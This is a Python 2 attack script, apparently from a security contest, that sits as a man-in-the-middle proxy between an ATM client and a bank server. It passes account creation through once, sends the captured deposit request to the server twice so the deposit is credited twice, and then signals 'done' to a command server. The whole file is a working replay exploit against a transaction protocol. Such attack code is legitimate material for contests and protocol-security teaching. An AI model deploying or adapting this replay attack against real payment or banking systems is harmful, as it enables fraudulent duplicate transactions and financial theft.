#!/usr/bin/env python2
from __future__ import print_function
import traceback
import random
import socket
import argparse
import threading
import signal
import json
import requests
import sys
import time
from Queue import Queue
from contextlib import contextmanager

def do_mitm_replay(args):
  # Set up server socket for atm to reach
  from_atm = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  from_atm.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
  from_atm.bind(("", args.p))
  from_atm.listen(1)
  print("started")
  sys.stdout.flush()
  # Allow account creation
  relay_replay(from_atm, args.s, args.q, 1)
  # Replay deposit
  relay_replay(from_atm, args.s, args.q, 2)


def relay_replay(socket_in, host, port, count):
  conn, addr = socket_in.accept()
  data_in = conn.recv(4096)
  for i in range(count):
    upstream = socket.socket()
    upstream.connect((host, port))
    upstream.sendall(data_in)
    message = upstream.recv(4096)
  conn.sendall(message)

def communicate(host, port, message):
  r = requests.post("http://" + host + ":" + str(port),
    data = message)
  return r.text

if __name__ == '__main__':
  parser = argparse.ArgumentParser(description='Proxy')
  parser.add_argument('-p', type=int, default=4000, help="listen port")
  parser.add_argument('-s', type=str, default="127.0.0.1", help="server ip address")
  parser.add_argument('-q', type=int, default=3000, help="server port")
  parser.add_argument('-c', type=str, default="127.0.0.1", help="command server")
  parser.add_argument('-d', type=int, default=5000, help="command port")
  args = parser.parse_args()
  try:
    do_mitm_replay(args)
  except:
    pass
  finally:
    communicate(args.c, args.d, {'REQUEST': {"type":"done"}})
